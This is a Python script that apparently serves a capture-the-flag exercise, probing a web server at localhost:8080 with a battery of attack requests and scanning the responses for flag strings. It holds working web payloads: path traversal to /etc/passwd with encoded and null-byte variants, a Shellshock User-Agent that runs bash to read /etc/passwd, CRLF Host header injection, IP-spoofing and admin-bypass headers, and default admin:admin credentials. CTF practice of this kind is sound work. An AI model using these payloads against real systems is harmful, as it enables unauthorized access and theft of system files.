#!/usr/bin/env python3
"""
Advanced Web Server Fingerprinting Test for CTF
Tests various fingerprinting techniques to find flags
"""

import requests
import socket
import ssl
import re
import base64
import hashlib

class AdvancedFingerprintTest:
    def __init__(self, target="http://localhost:8080"):
        self.target = target
        self.session = requests.Session()
        self.flags_found = []
        
    def test_malformed_requests(self):
        """Send malformed requests to trigger unique server responses"""
        print("\n[*] Testing malformed HTTP requests...")

        tests = [
            ("GET", "/../../../etc/passwd"),
            ("GET", "//admin//"),
            ("GET", "/.%2e/.%2e/.%2e/etc/passwd"),
            ("GET", "/\x00"),
            ("GET", "/%00"),
            ("GET", "/..;/"),
            ("TRACE", "/"),
            ("OPTIONS", "*"),
            ("PROPFIND", "/"),
            ("GET", "/admin?flag=true"),
            ("GET", "/index.php?page=../flag"),
        ]
        
        for method, path in tests:
            try:
                if method == "GET":
                    resp = self.session.get(self.target + path, allow_redirects=False, timeout=3)
                else:
                    resp = self.session.request(method, self.target + path, allow_redirects=False, timeout=3)

                self.check_for_flag(resp.text, f"{method} {path}")

                for header, value in resp.headers.items():
                    if 'flag' in header.lower() or 'flag' in str(value).lower():
                        print(f"[!] Potential flag in header {header}: {value}")
                        self.check_for_flag(str(value), f"Header {header}")
                        
            except Exception as e:
                pass
    
    def test_http_versions(self):
        """Test different HTTP versions for fingerprinting"""
        print("\n[*] Testing HTTP version responses...")
        
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        try:
            sock.connect(("localhost", 8080))

            request = "GET /\r\n"
            sock.send(request.encode())
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            self.check_for_flag(response, "HTTP/0.9 response")
            sock.close()

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("localhost", 8080))
            request = "GET / HTTP/1.0\r\n\r\n"
            sock.send(request.encode())
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            self.check_for_flag(response, "HTTP/1.0 response")

            if 'Server:' in response:
                server_line = response.split('Server:')[1].split('\r\n')[0].strip()
                print(f"[+] Server header: {server_line}")

                if len(server_line) > 20:
                    try:
                        decoded = base64.b64decode(server_line)
                        self.check_for_flag(decoded.decode('utf-8', errors='ignore'), "Base64 in Server header")
                    except:
                        pass
                        
            sock.close()
            
        except Exception as e:
            print(f"[-] Socket test failed: {e}")
    
    def test_special_headers(self):
        """Test with special headers that might reveal information"""
        print("\n[*] Testing special header combinations...")
        
        headers_tests = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"Referer": "http://admin.localhost:8080"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Debug": "1"},
            {"Debug": "true"},
            {"X-Test": "true"},
            {"X-Admin": "true"},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},
            {"Cookie": "admin=true; debug=1"},
        ]
        
        for headers in headers_tests:
            try:
                resp = self.session.get(self.target, headers=headers, timeout=3)

                if "flag" in resp.text.lower() or len(resp.text) > 5000:
                    print(f"[+] Interesting response with headers: {headers}")
                    self.check_for_flag(resp.text, f"Headers: {headers}")

                for h, v in resp.headers.items():
                    if h.lower() not in ['date', 'content-length', 'connection']:
                        if len(str(v)) > 30:
                            self.check_for_flag(str(v), f"Response header {h}")
                            
            except Exception:
                pass
    
    def test_content_type_confusion(self):
        """Test content-type confusion attacks"""
        print("\n[*] Testing content-type confusion...")
        
        content_types = [
            "application/x-httpd-php",
            "application/x-httpd-php-source",
            "text/plain",
            "application/octet-stream",
            "../../../../../../etc/passwd",
        ]
        
        for ct in content_types:
            try:
                resp = self.session.get(self.target + "/index.php", 
                                       headers={"Content-Type": ct}, timeout=3)
                self.check_for_flag(resp.text, f"Content-Type: {ct}")
            except:
                pass
    
    def test_method_override(self):
        """Test HTTP method override techniques"""
        print("\n[*] Testing HTTP method override...")
        
        override_headers = [
            ("X-HTTP-Method-Override", "PUT"),
            ("X-HTTP-Method", "PUT"),
            ("X-Method-Override", "PUT"),
            ("_method", "PUT"),
        ]
        
        for header, value in override_headers:
            try:
                resp = self.session.post(self.target, 
                                        headers={header: value}, 
                                        data={"test": "data"},
                                        timeout=3)
                self.check_for_flag(resp.text, f"{header}: {value}")
            except:
                pass
    
    def test_accept_headers(self):
        """Test various Accept headers for content negotiation"""
        print("\n[*] Testing Accept header variations...")
        
        accept_headers = [
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "application/json",
            "text/plain",
            "application/xml",
            "*/*",
            "../../",
            "flag",
        ]
        
        for accept in accept_headers:
            try:
                resp = self.session.get(self.target, 
                                       headers={"Accept": accept}, 
                                       timeout=3)
                if resp.status_code == 200:
                    self.check_for_flag(resp.text, f"Accept: {accept}")
            except:
                pass
    
    def test_user_agents(self):
        """Test different User-Agent strings"""
        print("\n[*] Testing User-Agent variations...")
        
        user_agents = [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "DirBuster-1.0-RC1",
            "nikto/2.1.5",
            "sqlmap/1.0.0",
            "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'",
            "../../",
            "admin",
            "flag",
            "",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
        ]
        
        for ua in user_agents:
            try:
                resp = self.session.get(self.target, 
                                       headers={"User-Agent": ua}, 
                                       timeout=3)
                self.check_for_flag(resp.text, f"User-Agent: {ua[:30]}...")
            except:
                pass
    
    def test_host_header(self):
        """Test Host header injection"""
        print("\n[*] Testing Host header variations...")
        
        hosts = [
            "localhost",
            "admin.localhost",
            "127.0.0.1",
            "localhost:8080@evil.com",
            "localhost:8080\r\nX-Injected: true",
            "",
            "flag",
        ]
        
        for host in hosts:
            try:
                resp = self.session.get(self.target, 
                                       headers={"Host": host}, 
                                       timeout=3)
                self.check_for_flag(resp.text, f"Host: {host}")
            except:
                pass
    
    def test_cookies(self):
        """Test various cookie combinations"""
        print("\n[*] Testing cookie variations...")

        resp = self.session.get(self.target)
        if resp.cookies:
            print(f"[+] Server set cookies: {resp.cookies}")
            for cookie in resp.cookies:
                self.check_for_flag(str(cookie.value), f"Cookie {cookie.name}")

        cookie_tests = [
            {"admin": "1"},
            {"debug": "true"},
            {"flag": "true"},
            {"I_am_admin": "68934a3e9455fa72420237eb05902327"},
            {"session": "../../etc/passwd"},
        ]
        
        for cookies in cookie_tests:
            try:
                resp = self.session.get(self.target, cookies=cookies, timeout=3)
                self.check_for_flag(resp.text, f"Cookies: {cookies}")
            except:
                pass
    
    def check_for_flag(self, content, source):
        """Check content for flag patterns"""
        if not content:
            return

        flag_pattern = re.compile(r'([a-f0-9]{64})', re.IGNORECASE)
        matches = flag_pattern.findall(content)
        
        for match in matches:
            if match not in self.flags_found:
                print(f"[!] FLAG FOUND via {source}: {match}")
                self.flags_found.append(match)

        flag_patterns = [
            r'flag\{([^}]+)\}',
            r'FLAG\{([^}]+)\}',
            r'ctf\{([^}]+)\}',
            r'CTF\{([^}]+)\}',
        ]
        
        for pattern in flag_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                flag = f"flag{{{match}}}"
                if flag not in self.flags_found:
                    print(f"[!] FLAG FOUND via {source}: {flag}")
                    self.flags_found.append(flag)
    
    def run(self):
        """Run all advanced fingerprinting tests"""
        print("="*60)
        print("Advanced Web Server Fingerprinting CTF Test")
        print("="*60)
        
        self.test_malformed_requests()
        self.test_http_versions()
        self.test_special_headers()
        self.test_content_type_confusion()
        self.test_method_override()
        self.test_accept_headers()
        self.test_user_agents()
        self.test_host_header()
        self.test_cookies()
        
        print("\n" + "="*60)
        print(f"Total unique flags found: {len(self.flags_found)}")
        if self.flags_found:
            print("\nFlags discovered:")
            for flag in self.flags_found:
                print(f"  - {flag}")
        print("="*60)

if __name__ == "__main__":
    tester = AdvancedFingerprintTest()
    tester.run()